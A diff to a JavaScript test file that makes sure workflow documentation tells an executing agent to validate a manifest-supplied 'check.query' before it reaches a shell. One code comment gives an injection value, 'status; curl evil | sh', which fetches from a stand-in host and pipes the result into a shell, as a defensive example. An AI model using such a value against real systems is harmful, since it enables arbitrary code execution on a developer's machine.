@@ -452,26 +452,29 @@ describe('ship:pre gate dispatch contract (#3559)', () => {
     );
   });
 
-  test('[security] the third-party check arm mandates in-context validation before any shell use', () => {
+  test('[security] the third-party check arm mandates validation before any shell use', () => {
     const region = preflightRegion();
 
     // #3559 made ship:pre reach THIRD-PARTY manifest strings for the first time — dispatch
     // previously never left the two first-party arms. `gates[].check` is not one of the four
     // executable surfaces the install consent prompt discloses (hooks, command modules,
     // mcpServers, reviewer lanes), so a capability can be consented to as declarative-only
-    // and still reach a shell here. The dispatch prose must therefore carry the same
-    // in-context validation contract loop-hook-dispatch.md already mandates for
-    // `ref.command`. If this instruction is ever dropped, a manifest `check.query` of
-    // `status; curl evil | sh` is interpolated straight into a command substitution.
+    // and still reach a shell here. If this mandate is ever dropped, a manifest `check.query`
+    // of `status; curl evil | sh` is interpolated straight into a command substitution.
+    //
+    // The RULE itself (charset, in-context, single-argv) lives once in the reference and is
+    // asserted in section 6 — restating it at all five dispatch sites would recreate exactly
+    // the doc-vs-implementation drift this PR had to repair.
     assert.match(
       region,
-      /\^\[a-z\]\[a-z0-9-\]\*\( \[a-z\]\[a-z0-9-\]\*\)\*\$/,
-      'the named-query arm must pin the exact charset a manifest-supplied query is validated against',
+      /Validate `check` before shell use/,
+      'the preflight must tell an executing agent to validate a manifest-supplied check before ' +
+      'it reaches a shell',
     );
     assert.match(
       region,
-      /IN-CONTEXT/,
-      'validation must be specified as in-context, never by pasting the value into a shell to be tested there',
+      /loop-hook-dispatch\\.md/,
+      'the mandate must point at the reference carrying the rule, so it is actionable',
     );
     assert.match(
       region,
@@ -673,8 +676,12 @@ const WORKFLOWS_DIR = path.join(__dirname, '..', 'gsd-core', 'workflows');
 
 // A manifest-supplied query interpolated into a shell command substitution.
 const SHELL_INTERPOLATED_QUERY = /gsd_run check \$\{hook\.check\.query\}/;
-// The charset a query must be validated against before it may be run.
+// The charset a query must be validated against before it may be run. Stated ONCE, in the
+// reference — restating it at five sites would be the drift this PR just repaired.
 const VALIDATION_CHARSET = /\^\[a-z\]\[a-z0-9-\]\*\( \[a-z\]\[a-z0-9-\]\*\)\*\$/;
+// The per-site mandate: every dispatch site must tell an executing agent to validate BEFORE
+// it reaches a shell, and where the rule lives.
+const VALIDATE_MANDATE = /Validate `check` before shell use/;
 
 function workflowFilesWithShellInterpolatedQuery() {
   // allow-test-rule: source-text-is-the-product (#3559)
@@ -714,20 +721,19 @@ describe('capability gate dispatch — manifest input is validated before shell 
       // $( ) is arbitrary code execution as the developer.
       assert.match(
         body,
-        VALIDATION_CHARSET,
+        VALIDATE_MANDATE,
         `${name} interpolates a manifest-supplied check.query into a shell command but never ` +
-        'pins the charset it must be validated against first. See the `gate` section of ' +
-        'gsd-core/references/loop-hook-dispatch.md.',
+        'tells an executing agent to validate it first.',
       );
       assert.match(
         body,
-        /IN-CONTEXT/,
-        `${name} must specify that validation happens in-context — never by pasting the value ` +
-        'into a shell to be tested there, which is already too late.',
+        /loop-hook-dispatch\.md/,
+        `${name} must point at the reference that carries the validation rule, so the mandate ` +
+        'is actionable rather than a bare warning.',
       );
       assert.ok(
-        body.search(VALIDATION_CHARSET) < body.search(SHELL_INTERPOLATED_QUERY),
-        `${name} states the validation rule only AFTER the interpolation it is supposed to ` +
+        body.search(VALIDATE_MANDATE) < body.search(SHELL_INTERPOLATED_QUERY),
+        `${name} states the validation mandate only AFTER the interpolation it is supposed to ` +
         'guard; an executing agent reads top-down and would run the command first.',
       );
     });
